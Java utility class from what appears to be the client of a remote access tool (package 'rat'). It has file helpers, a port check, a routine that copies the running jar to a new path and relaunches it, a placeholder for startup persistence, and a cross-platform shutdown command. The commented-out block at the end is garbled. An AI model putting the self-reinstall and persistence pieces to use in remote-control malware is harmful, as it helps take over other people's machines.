package rat.utils;

import org.apache.commons.lang3.SystemUtils;
import rat.client.ClientMain;

import java.io.*;
import java.net.DatagramSocket;
import java.net.ServerSocket;
import java.nio.file.FileVisitResult;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.SimpleFileVisitor;
import java.nio.file.attribute.BasicFileAttributes;

import static java.nio.file.FileVisitResult.CONTINUE;
import static java.nio.file.FileVisitResult.TERMINATE;

public class Util {

    private static String OS = System.getProperty("os.name").toLowerCase();

    public static byte[] toByteArray(InputStream in) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] buf = new byte[0x1000];
        while (true) {
            int r = in.read(buf);
            if (r == -1) {
                break;
            }
            out.write(buf, 0, r);
        }
        return out.toByteArray();
    }

    public static void deleteFileOrFolder(final Path path) throws IOException {
        Files.walkFileTree(path, new SimpleFileVisitor<Path>() {
            @Override
            public FileVisitResult visitFile(final Path file, final BasicFileAttributes attrs) throws IOException {
                Files.delete(file);
                return CONTINUE;
            }

            @Override
            public FileVisitResult visitFileFailed(final Path file, final IOException e) {
                return handleException(e);
            }

            private FileVisitResult handleException(final IOException e) {
                e.printStackTrace(); // replace with more robust error handling
                return TERMINATE;
            }

            @Override
            public FileVisitResult postVisitDirectory(final Path dir, final IOException e) throws IOException {
                if (e != null) return handleException(e);
                Files.delete(dir);
                return CONTINUE;
            }
        });
    }

    /**
     * Checks to see if a specific port is available.
     *
     * @param port the port to check for availability
     */
    public static boolean portAvailable(int port) {
        if (port < 0 || port > 65535) {
            return false;
        }

        ServerSocket ss = null;
        DatagramSocket ds = null;
        try {
            ss = new ServerSocket(port);
            ss.setReuseAddress(true);
            ds = new DatagramSocket(port);
            ds.setReuseAddress(true);
            return true;
        } catch (IOException e) {
        } finally {
            if (ds != null) {
                ds.close();
            }

            if (ss != null) {
                try {
                    ss.close();
                } catch (IOException e) {
                /* should not be thrown */
                }
            }
        }

        return false;
    }

    public static void installAndRestart(final String filePath) throws Exception {
        File inputFile = new File(ClientMain.class.getProtectionDomain().getCodeSource().getLocation().toURI()
                .getPath());

        byte[] data = new byte[(int) inputFile.length()];

        FileInputStream fis = new FileInputStream(inputFile);
        fis.read(data, 0, data.length);
        fis.close();

        FileOutputStream fos = new FileOutputStream(filePath);
        fos.write(data, 0, data.length);
        fos.flush();
        fos.close();

        Runtime.getRuntime().exec("java -jar " + filePath);
        System.exit(1);
    }

    public static void addToStartup(final String filePath) {
        System.out.println("Add to startup method: " + filePath);
    }

    public static boolean shutdown(int time) throws IOException {
        String shutdownCommand = null, t = time == 0 ? "now" : String.valueOf(time);

        if (SystemUtils.IS_OS_WINDOWS) {
            shutdownCommand = "shutdown.exe -s -t " + t;

        } else if (SystemUtils.IS_OS_AIX) {
            shutdownCommand = "shutdown -Fh " + t;

        } else if (SystemUtils.IS_OS_FREE_BSD || SystemUtils.IS_OS_LINUX || SystemUtils.IS_OS_MAC || SystemUtils
                .IS_OS_MAC_OSX || SystemUtils.IS_OS_NET_BSD || SystemUtils.IS_OS_OPEN_BSD || SystemUtils.IS_OS_UNIX) {
            shutdownCommand = "shutdown -h " + t;

        } else if (SystemUtils.IS_OS_HP_UX) {
            shutdownCommand = "shutdown -hy " + t;

        } else if (SystemUtils.IS_OS_IRIX) {
            shutdownCommand = "shutdown -y -g " + t;

        } else if (SystemUtils.IS_OS_SOLARIS ||
                SystemUtils.IS_OS_SUN_OS) {
            shutdownCommand = "shutdown -y -i5 -g" + t;

        } else {
            return false;
        }

        Runtime.getRuntime().exec(shutdownCommand);

        return true;
    }

    public static int objectSizeof(Object obj) {
        try {
            ByteArrayOutputStream byteOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteOutputStream);

            objectOutputStream.writeObject(obj);
            objectOutputStream.flush();
            objectOutputStream.close();

            return byteOutputStream.toByteArray().length;
        } catch (IOException e) {
            e.printStackTrace();
            return -1;
        }
    }

//    public staatic boolean isWindowsOS() {
//        return OS.contains("win");
//    }tic boolean isWindowsOS() {
//        return OS.contains("win");
//    }
//
//    public static boolean isMacOS() {
//        return OS.contains("mac");
//    }
//
//    public static boolean isUnixOS() {
//        return OS.contains("nix") || OS.contains("nux") || OS.contains("aix");
//    }
}
